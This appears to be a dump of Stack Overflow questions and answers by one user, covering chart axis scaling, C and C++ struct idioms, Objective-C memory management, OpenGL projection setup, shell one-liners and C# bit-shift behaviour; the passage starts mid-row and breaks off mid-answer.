<img src=""http://chart.apis.google.com/chart?cht=lc&amp;chs=650x220&amp;chg=0,20&amp;chxt=x,y&amp;chxl=0:|Jan|Feb|Mar|Apr|May|June|July|Aug|Sep|Oct|Nov|Dec&amp;chdl=Total%20Inbound|Total%20Outbound|New%20Callers|Unanswered%20Calls&amp;chco=6633CC,FFCC00,66CC33,FF0000&amp;chd=t:51,1357,376,0,0,0,0,0,0,0,0|41,372,6,0,0,0,0,0,0,0,01|64,311,43,0,0,0,0,0,0,0,0|0,11,0,0,0,0,0,0,0,0,0&amp;chds=1,1357&amp;chxr=1,0,1357"" alt=""alt text"">
The numbers are clean, but the top of the y value is always the same as the maximum value on the chart. This chart scales from 0 to 1357. I need to have calculated the proper value of 1400, <strong>problematically</strong>.</p>

<hr>

<p>I'm throwing in <a href=""http://stackoverflow.com/questions/611878/reasonable-optimized-chart-scaling/611979#611979"">rbobby</a>'s defanition of a 'nice' number here because it explains it so well.</p>

<ul>
<li>A ""nice"" number is one that has 3 or fewer non-zero digits (eg. 1230000)</li>
<li>A ""nice"" number has the same or few non-zero digits than zero digits (eg  1230 is not nice, 1200 is nice)</li>
<li>The nicest numbers are ones with multiples of 3 zeros (eg. ""1,000"", ""1,000,000"")</li>
<li>The second nicest numbers are onces with multples of 3 zeros plus 2 zeros (eg. ""1,500,000"", ""1,200"")</li>
</ul>

<h2>Solution</h2>

<p><img src=""http://i43.tinypic.com/21jc0no.png"" alt=""alt text"">
I found the way to get the results that I want using a modified version of Mark Ransom's idea.</p>

<p>Fist, Mark Ransom's code determines the optimum spacing between ticks, when given the number of ticks. Sometimes this number ends up being more than twice what the highest value on the chart is, depending on how many grid lines you want.</p>

<p>What I'm doing is I'm running Mark's code with 5, 6, 7, 8, 9, and 10 grid lines (ticks) to find which of those is the lowest. With a value of 23, the height of the chart goes to 25, with a grid line at 5, 10, 15, 20, and 25. With a value of 26, the chart's height is 30, with grid lines at 5, 10, 15, 20, 25, and 30. It has the same spacing between grid lines, but there are more of them.</p>

<p>So here's the steps to just-about copy what Excel does to make charts all fancy.</p>

<ol>
<li>Temporarily bump up the chart's highest value by about 5% (so that there is always some space between the chart's highest point and the top of the chart area. We want 99.9 to round up to 120)</li>
<li>Find the optimum grid line placement
for 5, 6, 7, 8, 9, and 10 grid
lines.</li>
<li>Pick out the lowest of those numbers. Remember the number of grid lines it took to get that value.</li>
<li>Now you have the optimum chart height. The lines/bar will never butt up against the top of the chart and you have the optimum number of ticks.</li>
</ol>

<p>PHP:</p>

<pre><code>function roundUp($maxValue){
    $optiMax = $maxValue * 2;
    for ($i = 5; $i &lt;= 10; $i++){
        $tmpMaxValue = bestTick($maxValue,$i);
        if (($optiMax &gt; $tmpMaxValue) and ($tmpMaxValue &gt; ($maxValue + $maxValue * 0.05))){
            $optiMax = $tmpMaxValue;
            $optiTicks = $i;
        }
    }
    return $optiMax;
}
function bestTick($maxValue, $mostTicks){
    $minimum = $maxValue / $mostTicks;
    $magnitude = pow(10,floor(log($minimum) / log(10)));
    $residual = $minimum / $magnitude;
    if ($residual &gt; 5){
        $tick = 10 * $magnitude;
    } elseif ($residual &gt; 2) {
        $tick = 5 * $magnitude;
    } elseif ($residual &gt; 1){
        $tick = 2 * $magnitude;
    } else {
        $tick = $magnitude;
    }
    return ($tick * $mostTicks);
}
</code></pre>

<p>Python:</p>

<pre><code>import math

def BestTick(largest, mostticks):
    minimum = largest / mostticks
    magnitude = 10 ** math.floor(math.log(minimum) / math.log(10))
    residual = minimum / magnitude
    if residual &gt; 5:
        tick = 10 * magnitude
    elif residual &gt; 2:
        tick = 5 * magnitude
    elif residual &gt; 1:
        tick = 2 * magnitude
    else:
        tick = magnitude
    return tick

value = int(input(""""))
optMax = value * 2
for i in range(5,11):
    maxValue = BestTick(value,i) * i
    print maxValue
    if (optMax &gt; maxValue) and (maxValue &gt; value  + (value*.05)):
        optMax = maxValue
        optTicks = i
print ""\nTest Value: "" + str(value + (value * .05)) + ""\n\nChart Height: "" + str(optMax) + "" Ticks: "" + str(optTicks)
</code></pre>
","9530","Adam Rosenfield","<p>You could round up to two significant figures.  The following pseudocode should work:</p>

<pre><code>// maxValue is the largest value in your chart
magnitude = floor(log10(maxValue))
base = 10^(magnitude - 1)
chartHeight = ceiling(maxValue / base) * base
</code></pre>

<p>For example, if <code>maxValue</code> is 1357, then magnitude is 3 and base is 100.  Dividing by 100, rounding up, and multiplying by 100 has the result of rounding up to the next multiple of 100, i.e. rounding up to two significant figures.  In this case, the result if 1400 (1357 ⇒ 13.57 ⇒ 14 ⇒ 1400).</p>
"
"<p>In C++, is there any difference between:</p>

<pre><code>struct Foo { ... };
</code></pre>

<p>and </p>

<pre><code>typedef struct { ... } Foo;
</code></pre>
","9530","Adam Rosenfield","<p>In C++, there is only a subtle difference.  It's a holdover from C, in which it makes a difference.</p>

<p>In C, there are two different namespaces of types: a namespace of struct/union/enum <em>tag</em> names and a namespace of typedef names.  If you just said</p>

<pre><code>struct Foo { ... };
Foo x;
</code></pre>

<p>You would get a compiler error, because <code>Foo</code> is only defined in the tag namespace.  You'd have to declare it as</p>

<pre><code>struct Foo x;
</code></pre>

<p>Any time you want to refer to a <code>Foo</code>, you'd always have to call it a <code>struct Foo</code>.  This gets annoying fast, so you can add a typedef:</p>

<pre><code>struct Foo { ... };
typedef struct Foo Foo;
</code></pre>

<p>Now both <code>struct Foo</code> (in the tag namespace) and just plain <code>Foo</code> (in the typedef namespace) both refer to the same thing, and you can freely declare objects of type <code>Foo</code> without the struct keyword.  The construct</p>

<pre><code>typedef struct Foo { ... } Foo;
</code></pre>

<p>is just an abbreviation for the declaration and typedef.  Finally,</p>

<pre><code>typedef struct { ... } Foo;
</code></pre>

<p>declares an anonymous structure and creates a typedef for it.  Thus, with this construct, it doesn't have a name in the tag namespace, only a name in the typedef namespace.  This means it also can't be forward-declared.  If you want to make a forward declaration, you have to give it a name in the tag namespace.</p>

<p>In C++, all struct/union/enum/class declarations act like they are implicitly <code>typedef</code>'ed, as long as the name is not hidden by another declaration with the same name.  See <a href=""http://stackoverflow.com/questions/612328/difference-between-struct-and-typedef-struct-in-c/612476#612476"">Michael Burr's answer</a> for the full details.</p>
"
"<p>In C++, I have a class which contains an anonymous bitfield struct.  I want to initialize it to zero without having to manually write out all fields.</p>

<p>I can imagine putting the initialization in three places:</p>

<ol>
<li>Create a constructor in the bitfield</li>
<li>Zero out in the initializer list of the constructor for the containing class</li>
<li>Zero out in the body of the constructor for the containing class</li>
</ol>

<p>This bitfield has many fields, and I'd rather not list them all.</p>

<p>For example see the following code:</p>

<pre><code>class Big {
    public:
        Big();

        // Bitfield struct
        struct bflag_struct {
            unsigned int field1 : 1;
            unsigned int field2 : 2;
            unsigned int field3 : 1;
            // ...
            unsigned int field20 : 1;
            // bflag_struct(); &lt;--- Here?
        } bflag;

        unsigned int integer_member;
        Big         *pointer_member;
}

Big::Big()
  : bflag(),             // &lt;--- Can I zero bflag here?
    integer_member(0),
    pointer_member(NULL)
{
    // Or here?
}
</code></pre>

<p>Is one of these preferable? Or is there something else I'm missing?</p>

<p>Edit: Based on the accepted answer below (by Ferruccio) I settled on this solution:</p>

<pre><code>class Big {
    // ...

    struct bflag_struct {
        unsigned int field 1 : 1;
        // ...
        bflag_struct() { memset(this, 0, sizeof *this); };
    }

    // ...
}
</code></pre>
","9530","Adam Rosenfield","<p>You could use a union, although that would add an extra level of indirection when accessing the fields:</p>

<pre><code>class Big {
    union {
        struct {
            unsigned int field1 : 1;
            ...
        } fields;
        unsigned int all_fields;
    };
    ...
};

Big::Big()
  : all_fields(0),
    ...
{
    ...
}
</code></pre>

<p>MSVC allows anonymous structs inside of unions (see, e.g. the definition of <code>D3DMATRIX</code> in <code>&lt;d3d9.h&gt;</code>), but this is a non-standard C++ extension which you should avoid using if you can.</p>
"
"<p>I have tried:</p>

<pre><code> grep -c ""\|"" *.*
</code></pre>

<p>But it didn't work, since it gives an incorrect count of consecutive pipes.</p>

<p>How can I accomplish this?</p>
","9530","Adam Rosenfield","<p>You can use <code>tr(1)</code> to delete all non-pipe characters and then use <code>wc(1)</code> to get a total:</p>

<pre><code>cat *.* | tr -d -c '|' | wc -c
</code></pre>
"
"<p>What is a good algorithm for reducing the number of vertices in a polygon without changing the way it looks very much?</p>

<p>Input: A polygon, represented as a list of points, with way too many verticies: raw input from the mouse, for example.</p>

<p>Output: A polygon with much fewer verticies that still looks a lot like the original: something usable for collision detection, for example (not necessarily convex).</p>

<p>Edit: The solution to this would be similar to finding a multi-segmented line of best fit on a graph.  It's called Segmented Least Squares in my algorithms book.</p>

<p>Edit2: The Douglas Peucker Algorithm is what I really want.</p>
","9530","Adam Rosenfield","<p>There's a lot of material out there.  Just google for things like ""mesh reduction"", ""mesh simplification"", ""mesh optimization"", etc.</p>
"
"<p>Are there any alternatives to the code below:</p>

<pre><code>startFromLine = 141978 # or whatever line I need to jump to

urlsfile = open(filename, ""rb"", 0)

linesCounter = 1

for line in urlsfile:
    if linesCounter &gt; startFromLine:
        DoSomethingWithThisLine(line)

    linesCounter += 1
</code></pre>

<p>if I'm processing a huge text file (~15MB) with lines of unknown but different length, and need to jump to a particular line which number I know in advance? I feel bad by processing them one by one when I know I could ignore at least first half of the file. Looking for more elegant solution if there is any.</p>
","9530","Adam Rosenfield","<p>You can't jump ahead without reading in the file at least once, since you don't know where the line breaks are.  You could do something like:</p>

<pre><code># Read in the file once and build a list of line offsets
line_offset = []
offset = 0
for line in file:
    line_offset.append(offset)
    offset += len(line)
file.seek(0)

# Now, to skip to line n (with the first line being line 0), just do
file.seek(line_offset[n])
</code></pre>
"
"<p>I've only recently began using the debugger extensively, so I'm not sure if this is a limitation. </p>

<p>When I debug on the iPhone, the variables aren't up to date unless I explicitly view it (<kbd>ctrl</kbd>+<kbd>click</kbd> -> <kbd>view variable as expression</kbd>). Is there a way to view actual variables without viewing explicitly?</p>
","9530","Adam Rosenfield","<p>Can you clarify your question?  You should only be viewing data while the program is stopped -- examining data while it's running, if it works at all, is much less useful.  Make sure to set a breakpoint, and then examine data once you've hit the breakpoint.</p>

<p>An alternative to using Xcode's built-in debugging features is to use the gdb console.  Type ⌘-Shift-R, or select ""Debugging Console"" from the menu to open the console.  Then, you can type commands like:</p>

<pre><code># View a variable
print var
# View this object's member variable
print self-&gt;memberVar
# Ask an Objective-C object to print itself:
print-object self
</code></pre>

<p>You should use <code>print</code> with primitive types (<code>int</code>, <code>char*</code>, etc.) and POD types (structs); you should use <code>print-object</code> with Objective-C objects (<code>NSString</code>, etc.).  For more information about <code>print</code> and <code>print-object</code>, type</p>

<pre><code>help print
help print-object
</code></pre>

<p>You can also use the abbreviations <code>p</code> and <code>po</code> for <code>print</code> and <code>print-object</code> respectively.</p>
"
"<p>I am creating a simple 2D OpenGL application but I seem to be experiencing some camera issues. When I draw a rectangle at (20,20) it is drawn at (25,20) or so. When I draw it at (100, 20) it is drawn at 125 or so. For some reasons everything is being shifted to the right by a few %.</p>

<p>I have pasted a trimmed down version here
<a href=""http://pastebin.com/m56491c4c"" rel=""nofollow"">http://pastebin.com/m56491c4c</a></p>

<p>Is there something wrong with the way I am setting up GLUT? I know it's not my objects doing anything weird since the same thing happens when I disable them.</p>

<p>Thanks in advance.</p>
","9530","Adam Rosenfield","<p>You need to set the projection matrix inside the reshape function (<code>resize()</code>), which also automatically solves the problem of the user resizing the window:</p>

<pre><code>void resize(int w, int h)
{
  glMatrixMode(GL_PROJECTION);
  glLoadIdentity();
  gluOrtho2D(0, w, h, 0);
}
</code></pre>

<p>And then in your draw function, make sure that the matrix mode is model-view:</p>

<pre><code>void draw()
{
  glMatrixMode(GL_MODELVIEW);
  glLoadIdentity();
  ...
}
</code></pre>

<p>Other problems with your code:</p>

<ul>
<li>You probably shouldn't be calling <code>glutPostRedisplay()</code> at the end of <code>draw()</code>.  This is going to make your CPU run at 100%.  You can instead use <code>glutTimerFunc()</code> to still have updates every some number of milliseconds.</li>
<li>In <code>processMouse()</code>, you're using <code>wsprintf()</code> on an array of <code>char</code>s: <code>wsprintf()</code> takes an array of wide characters (<code>wchar_t</code>), so you should make the local variable <code>s</code> of type <code>wchar_t[]</code>, or use <code>sprintf()</code> and <code>MessageBoxA()</code> instead of <code>wsprintf()</code> and <code>MessageBoxW()</code> (to which <code>MessageBox() </code> expands as a macro when compiling a Unicode application, which I'm assuming you're doing).  You're also vulnerable to a buffer overflow -- you should use a buffer of at least 12 characters, even though realistically you'll never be passed a very large <code>x</code> value.  Finally, you should also use <code>snprintf()/wsnprintf()</code> instead of <code>sprintf()/wsprintf()</code> to protect against the buffer overflow.</li>
</ul>
"
"<p>I have a testing struct definition as follows:</p>

<pre><code>struct test{
    int a, b, c;
    bool d, e;
    int f;
    long g, h;
};
</code></pre>

<p>And somewhere I use it this way:</p>

<pre><code>test* t = new test;   // create the testing struct
int* ptr = (int*) t;
ptr[2] = 15;          // directly manipulate the third word
cout &lt;&lt; t-&gt;c;         // look if it really affected the third integer
</code></pre>

<p>This works correctly on my Windows - it prints 15 as expected, but is it safe? Can I be really sure the variable is on the spot in memory I want it to be - expecially in case of such combined structs (for example f is on my compiler the fifth word, but it is a sixth variable)?</p>

<p>If not, is there any other way to manipulate struct members directly without actually having struct->member construct in the code?</p>
","9530","Adam Rosenfield","<p>To add to <a href=""http://stackoverflow.com/questions/623693/accessing-struct-members-directly/623709#623709"">JaredPar's answer</a>, another option in C++ only (not in plain C) is to create a pointer-to-member object:</p>

<pre><code>struct test
{
  int a, b, c;
  bool d, e;
  int f;
  long g, h;
};

int main(void)
{
  test t1, t2;

  int test::*p;  // declare p as pointing to an int member of test
  p = &amp;test::c;  // p now points to 'c', but it's not associating with an object
  t1-&gt;*p = 3;    // sets t1.c to 3
  t2-&gt;*p = 4;    // sets t2.c to 4

  p = &amp;test::f;
  t1-&gt;*p = 5;    // sets t1.f to 5
  t2-&gt;*p = 6;    // sets t2.f to 6
}
</code></pre>
"
"<p>I'm doing a short project just to experiment writing without the use of nib files (personal interest only, don't plan on never using nibs!).</p>

<p>I have my app controller set up as NSApp's delegate. Under -(void)applicationDidFinishLaunching:(NSNotification *)aNotification, I attempt to initialize the interface.</p>

<p>AppController.h:</p>

<pre><code>#import &lt;Cocoa/Cocoa.h&gt;
#import &lt;QTKit/QTKit.h&gt;

@interface AppController : NSObject {

NSWindow* mainWindow;
QTMovieView* movieView;
QTCaptureSession* mainSession;
QTCaptureMovieFileOutput* output;
QTCaptureDeviceInput* video;
QTCaptureDeviceInput* audio;

}

+ (void)initialize;
- (id)init;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification;

@end
</code></pre>

<p>Method in AppController.m</p>

<pre><code>- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {


//Proceed to initialize the entire interface:

mainWindow = [[NSWindow alloc] initWithContentRect:NSMakeRect(500, 300, 700, 500)
styleMask:(NSTitledWindowMask|NSClosableWindowMask|
  NSMiniaturizableWindowMask|NSResizableWindowMask)	
backing:NSBackingStoreBuffered
defer:NO];

[mainWindow setTitle:@""Record a movie!""];

/*movieView = [[QTMovieView alloc] initWithFrame:NSMakeRect([[mainWindow contentView] bounds].origin.x + 5, 
												[[mainWindow contentView] bounds].origin.y + 30,
											        [[mainWindow contentView] bounds].size.width - 10, 
											        [[mainWindow contentView] bounds].size.height - 35)];*/

[[mainWindow contentView] addSubview:movieView];

[mainWindow makeKeyAndOrderFront:NSApp];

}
</code></pre>

<p>The part commented out is the origin of the 1 error that doesn't appear in the text editor, only in the ""build"" panel:</p>

<pre><code>&lt;pre&gt; "".objc_class_name_QTMovieView"", referenced from:  
literal-pointer@_OBJC@_cls_refs@QTMovieView in AppController.o
symbol(s) not found
collect2: Id returned 1 exit status
</code></pre>

<p>There seems to be a problem with alloc/init'ing an instance here. I can declare a new one just fine, i.e. QTMovieView *test; and nothing complains. I've also found that it does the same thing with all the other QT classes when I try to alloc/init them. However, I was able to alloc/init NSWindow just fine. The framework is in my project and as you can see in my .h file, I included QTKit. </p>

<p>Anyone know what's going on? </p>
","9530","Adam Rosenfield","<p>The error you're getting is a linker error -- the linker (<code>ld</code>) can't find the framework object code for the <code>QTMovieView</code> class.  Therefore, you haven't included the QTKit framework in your project.  If you think you have, then something about it isn't set up properly.</p>
"
"<p>I am using the following piece of C code to change file extension.</p>

<p>{</p>

<pre><code> #define EVAL_MAX_LEN (300)

 int nLen;
 char szOut [EVAL_MAX_LEN] = {0};
 char szPath [EVAL_MAX_LEN] = ""/db/file/face.bmp"";

 // Get string length !!!
 nLen = strlen (szPath);

 if ((nLen &gt; 0) &amp;&amp; (nLen &lt; EVAL_MAX_LEN)) {

      while (nLen) {

           // Check for extension character !!!
           if (szPath [nLen] == '.') {

                szPath [nLen] = '\0';
                break;
           }

           nLen --;

      }//while (nLen ...

 // Create output file name and with new extension
 sprintf (szOut, ""%s.txt"", szPath);

 }// if ((nLen &gt; 0) &amp;&amp; (nLen &lt; EVAL_MAX_LEN ...
</code></pre>

<p>}</p>

<p>Any suggestion for a better and more elegant code is welcome. I also know that in Windows we can use _splitpath to do this in an elegant manner. But right now, I am using this code in Linux.</p>
","9530","Adam Rosenfield","<p>You should use <code>snprintf()</code> instead of <code>sprintf()</code> to avoid a potential buffer overflow.  You can also use <a href=""http://linux.die.net/man/3/strrchr"" rel=""nofollow""><code>strrchr(3)</code></a> to find the last period, instead of coding your own loop.  However, two things to be careful of:</p>

<ol>
<li>What if the input file has no extension, i.e. there is no dot in the path name?</li>
<li>What if the input file has no extension, but one of the folders in the path name has a dot in it?  For example: <code>""/home/joeuser/dotted.folder/thefile""</code></li>
</ol>

<p>Make sure you handle both of those cases appropriately.</p>
"
"<p>I have a service, say foo, written in C++, that runs as root.  There is the usual scrip, /etc/init.d/foo start|stop|restart.</p>

<p>At certain times, foo needs to reload itself.  Normally after an upgrade has finished.  But doing things like:</p>

<pre><code>system(""/etc/init.d/foo restart"")
</code></pre>

<p>doesn't work since as soon as restart kills foo, the system() call obviously gets killed as well, and the restart script never executes to completion.</p>

<p>Is there another call I can use instead of system() that runs asynchronously as a sibling to the calling process, instead of creating a synchronous child?</p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>Combining the two answers so far, use a <a href=""http://en.wikipedia.org/wiki/Fork-exec"" rel=""nofollow"">fork-exec</a>.</p>
"
"<p>I'm seeing a crash that happens 10 or 20 seconds after a POST request I make has finished (<code>didReceiveResponse</code>, <code>didReceiveData</code> and <code>connectionDidFinishLoading</code> all fire well before the crash happens).</p>

<p>This is the code I'm using to make the request:</p>

<pre><code>NSURL* url = [[NSURL alloc] initWithString:urlString];
[urlString release];

NSData* requestData = [jsonData dataUsingEncoding:NSUTF8StringEncoding];
NSString* requestDataLengthString = [[NSString alloc] initWithFormat:@""%d"", [requestData length]];

NSMutableURLRequest* request = [[NSMutableURLRequest alloc] initWithURL:url];
[request setHTTPMethod:@""POST""];
[request setHTTPBody:requestData];
[request setValue:@""application/json"" forHTTPHeaderField:@""Content-Type""];
[request setValue:requestDataLengthString forHTTPHeaderField:@""Content-Length""];
[request setTimeoutInterval:30.0];
[url release];
[requestData release];
[requestDataLengthString release];

m_URLConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];	
[request release];
</code></pre>

<p>What's very odd about this crash is this: if I <strong>do not call</strong> setHTTPBody with my <code>NSData</code> object, <code>setValue:@""application/json""</code> for <code>Content-Type</code> and <code>setValue:requestDataLengthString</code> for <code>Content-Length</code>, the crash does <strong>not</strong> happen. I'm completely perplexed as to what is happening. As far as I can tell, the crash is directly related to sending an <code>NSData</code> object with my request. When it does crash, the top elements in the call stack for the crash (<code>EXEC_BAD_ACCESS</code>) are the following:</p>

<ul>
<li><code>objc_msgSend</code></li>
<li><code>CFRelease</code></li>
<li><code>HTTPMessage::~HTTPMessage</code></li>
<li><code>_CFRelease</code></li>
<li><code>HTTPWriteFilter::~HTTPWriteFilter</code></li>
</ul>

<p>Can anyone think of something I might be doing wrong? I'm completely at a loss for what I'm doing wrong, how to fix it, or how to work around it. Is there a better way to POST data than the way I'm doing?</p>
","9530","Adam Rosenfield","<p>You are correct in that the problem is with your <code>NSData</code> object.  You're allocating it like so:</p>

<pre><code>NSData* requestData = [jsonData dataUsingEncoding:NSUTF8StringEncoding];
</code></pre>

<p>According to the rules laid out in the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>, you're not an owner of the data, so you shouldn't be calling <code>release</code> on it later on.  <code>dataUsingEncoding</code> calls <code>autorelease</code>, so the object will be <code>release</code>d the next time the autorelease pool drains.  Because you're adding an extra <code>release</code>, the autorelease pool is going to try to <code>release</code> an object which has already been deallocated, which is causing the crash.</p>
"
"<p>How can I remove everything else in a folder except FileA, even hidden files?
I use Ubuntu.</p>

<p>I tried the following unsuccessfully</p>

<pre><code>rm [^fileA]
</code></pre>
","9530","Adam Rosenfield","<p>Use <code>extglob</code>.  Assuming that <code>FileA</code> is a regular file (i.e. does not begin with a <code>.</code>), then you can do:</p>

<pre><code>shopt -s extglob  # Enable extglob
rm !(FileA) .*  # Remove all regular files not named FileA and all hidden files
</code></pre>

<p>If instead <code>FileA</code> is a hidden file, this won't work, since the <code>!(</code><em>pattern</em><code>)</code> construct only creates a list of all regular files not matching <em>pattern</em>.</p>
"
"<p>In C++, say you want to declare a global  variable to be used by many. How do you do it?</p>

<p>I commonly use declare and define in cpp file, and then use extern  in other cpp file (and not headers).</p>

<p>I don't like this approach, and I am considering something along these lines:</p>

<p>In a header file:</p>

<p>some_file.h</p>

<pre><code>Class MYGlobalClass
{

};


MyGlobalClass&amp; MyGlobalClassInstance()
{
   static MYGlobalClass instance; 
   return  instance;

}
</code></pre>

<p><strong>Edit</strong></p>

<p><strong><em>Consider  in the following contexts:</em></strong> </p>

<ul>
<li>can be used in multi-threaded applications</li>
<li>namespace pollution</li>
<li>may NOT necessery be a singleton, as many instances of this might be created </li>
</ul>

<p>What are your thoughts, suggestions, new ideas?</p>
","9530","Adam Rosenfield","<p>It it's truly a global variable that could theoretically be accessed externally by any module, you should put the extern declaration in the header file:</p>

<pre><code>// MyClass.h
class MyClass { ... };
extern MyClass myGlobalInstance;

// MyClass.cpp
MyClass myGlobalInstance;
</code></pre>

<p>If it's just a global object that should really only be accessed by a single module, limit its scope by either making it a private (or protected) static class variable, a static function variable (if it's only needed by one function), or in an anonymous namespace:</p>

<p>Option 1:</p>

<pre><code>// MyClass.h
class MyClass
{
private:  // or protected, if you want it accessible by subclasses
    static MyClass myGlobalInstance;
};
</code></pre>

<p>Option 2:</p>

<pre><code>// MyClass.cpp
void someFunction()
{
    // it's global, but only accessible inside this function
    static MyClass myGlobalInstance;
    ...
}
</code></pre>

<p>Option 3:</p>

<pre><code>// MyClass.cpp
namespace
{
    MyClass myGlobalInstance;
}

// it's now only accessible in this file
</code></pre>
"
"<p>I'm writing a rake script and would like to detect (using Ruby rather than bash if possible) if the user who executed the rake script has root privileges.</p>

<p>If it is not root then I would like to terminate the script.</p>
","9530","Adam Rosenfield","<p>I don't know Ruby, but what you want to check for is if the user ID is 0.  In C, you would do this by checking <a href=""http://linux.die.net/man/2/getuid"" rel=""nofollow""><code>getuid()</code></a>.  From the Unix command line, you could also check the output of <a href=""http://linux.die.net/man/1/id"" rel=""nofollow""><code>id -u</code></a>.</p>
"
"<p>I'm writing an iPhone app.  I have a header file that looks like this:</p>

<pre><code>
@interface EditTagsViewController : UITableViewController {
  NSMutableArray *allTags;
  NSMutableArray *selectedTags;
  NSInteger currentFavorite;
}
@property (nonatomic, retain) NSMutableArray *allTags;
@property (nonatomic, retain) NSMutableArray *selectedTags;
@property (nonatomic) NSInteger currentFavorite;
@end
</code></pre>

<p>In the implementation file, my viewDidLoad method looks like this:</p>

<pre><code>
- (void)viewDidLoad {
  NSMutableArray *aTags = [[NSMutableArray alloc] initWithArray:[Tag findAllTags]];
  self.allTags = aTags;
  [aTags release];

  NSMutableArray *sTags = [[NSMutableArray alloc] initWithArray:[Tag findByFavoriteId:currentFavorite]];
  self.selectedTags = sTags;
  [sTags release];

  UIBarButtonItem *add = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(addNewTag:)];
  self.navigationItem.rightBarButtonItem = add;
  [add release];
  [super viewDidLoad];
}
</code></pre>

<p>Here is my dealloc method:</p>

<pre><code>
- (void)dealloc {
  [allTags release];
  [selectedTags release];
  [super dealloc];
}
</code></pre>

<p>What's confusing to me is that when I run the app both in the simulator and on the device itself, using Instruments (memory leaks), it tells me that this line in my viewDidLoad method is leaking an array:</p>

<pre><code>
self.selectedTags = sTags;
</code></pre>

<p>It's confusing because I'm using the exact same technique with 2 different variables, and yet no leak is reported with the first one.</p>

<p>I feel like I'm missing something obvious here.  Any ideas?</p>
","9530","Adam Rosenfield","<p>Your code looks correct to me.  Is it possible that one of <code>[Tag findAllTags]</code> or <code>[Tag findByFavoriteId:]</code> is leaking?  Are you making sure to set <code>self.allTags</code> and <code>self.selectedTags</code> to <code>nil</code> in <code>dealloc</code>?</p>

<p>Be mindful of the difference between saying <code>self.allTags = ...</code> and <code>allTags = ...</code>.  Because <code>allTags</code> is a property and has the <code>retain</code> attribute, whenever you assign via <code>self.allTags = ...</code>, it implicitly calls the setter method <code>[self setAllTags:...]</code>, which invokes <code>retain</code> on the new value and <code>release</code> on the old value (if any).  You're doing it correctly in this code sample, but if elsewhere you're assigning straight to <code>allTags</code> (without the <code>self.</code>), you're not <code>release</code>ing the old value, which may be the source of the leak.  Likewise for <code>selectedTags</code>.</p>
"
"<p>In chapter 8 of Godel, Escher, Bach by Douglas Hofstader, the reader is challenged to translate these 2 statements into TNT:</p>

<p>""b is a power of 2""</p>

<p>and</p>

<p>""b is a power of 10""</p>

<p>Are following answers correct?:</p>

<p>(Assuming '&#x2203;' to mean 'there exists a number'):</p>

<p>&#x2203;x:(x.x = b)</p>

<p>i.e. ""there exists a number 'x' such that x multiplied x equals b""</p>

<p>If that is correct, then the next one is equally trivial:</p>

<p>&#x2203;x:(x.x.x.x.x.x.x.x.x.x = b)</p>

<p>I'm confused because the author indicates that they are tricky and that the second one should take hours to solve; I must have missed something obvious here, but I can't see it!</p>
","9530","Adam Rosenfield","<p>Your expressions are equivalent to the statements ""b is a square number"" and ""b is the 10th power of a number"" respectively.  Converting ""power of"" statements into TNT is considerably trickier.</p>
"
"<p>Consider the following code:</p>

<pre><code>UInt32 val = 1;
UInt32 shift31 = val &lt;&lt; 31;                    // shift31  == 0x80000000
UInt32 shift32 = val &lt;&lt; 32;                    // shift32  == 0x00000001
UInt32 shift33 = val &lt;&lt; 33;                    // shift33  == 0x00000002
UInt32 shift33a = (UInt32)((UInt64)val &lt;&lt; 33); // shift33a == 0x00000000
</code></pre>

<p>It doesn't generate a warning (about using a shift greater than 32) so it must be an expected behavior.</p>

<p>The code that actually gets put out to the generated assembly (or at least Reflector's interpretation of the code) is</p>

<pre><code> uint val = 1;
 uint shift31 = val &lt;&lt; 0x1f;
 uint shift32 = val;
 uint shift33 = val &lt;&lt; 1;
 uint shift33a = val &lt;&lt; 0x21;
</code></pre>

<p>The IL (again, using Reflector) is</p>

<pre><code>L_0000: nop 
L_0001: ldc.i4.1 
L_0002: stloc.0 
L_0003: ldloc.0 
L_0004: ldc.i4.s 0x1f
L_0006: shl 
L_0007: stloc.1 
L_0008: ldloc.0 
L_0009: stloc.2 
L_000a: ldloc.0 
L_000b: ldc.i4.1 
L_000c: shl 
L_000d: stloc.3 
L_000e: ldloc.0 
L_000f: conv.u8 
L_0010: ldc.i4.s 0x21
L_0012: shl 
L_0013: conv.u4 
L_0014: stloc.s shift33a
</code></pre>

<p>I understand <strong>what</strong> is going on (it's described in <a href=""http://msdn.microsoft.com/en-us/library/aa691377.aspx"" rel=""nofollow"">MSDN</a>); when the code is compiled, only the lower 5 bits are being used when shifting a 32-bit value... I'm curious as to <strong>why</strong> this happens.  </p>

<p>(The way <code>shift33a</code> comes out also makes me think that something isn't quite right with Reflector, as their c# presentation of the IL will compile to something different)</p>

<p><strong>The question(s):</strong></p>

<ul>
<li><strong>Why</strong> are only the lower 5 bits of ""the value to shift by"" used?   </li>
<li>If ""it doesn't make sense to shift more than 31 bits"", why isn't there a warning?</li>
<li>Is this a backwards compatilbility thing (i.e. is this what programmers ""expect"" to happen)?</li>
<li>Am I correct that the underlying IL can do shifts of more than 31 bits (as in <code>L_0010: ldc.i4.s 0x21</code>) but the compiler is trimming the values?</li>
</ul>
","9530","Adam Rosenfield","<p>It basically boils down to the way the x86 handles the arithmetic shift opcodes: it only uses the bottom 5 bits of the shift count.  See the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SAL.htm"">80386 programming guide</a>, for example.  In C/C++, it's technically undefined behavior to do a bit shift by more than 31 bits (for a 32-bit integer), going with the C philosophy of ""you don't pay for what you don't need"".  From section 6.5.7, paragraph 3 of the C99 standard:</p>

<blockquote>
  <p>The integer promotions are performed on each of the operands. The type of the result is that of the promoted left operand. If the value of the right operand is negative or is
  greater than or equal to the width of the promoted left operand, the behavior is undefined.</p>
</blockquote>

<p>This allows compilers to omit a single shift instruction on x86 for shifts.  64-bit shifts cannot be done in one instruction on x86.  They use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SHLD.htm"">SHLD</a>/<a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SHRD.htm"">SHRD</a> instructions plus some additional logic.  On x86_64, 64-bit shifts can be done in one instruction.</p>

<p>For example, gcc 3.4.4 emits the following assembly for a 64-bit left-shift by an arbitrary amount (compiled with <code>-O3 -fomit-frame-pointer</code>):</p>

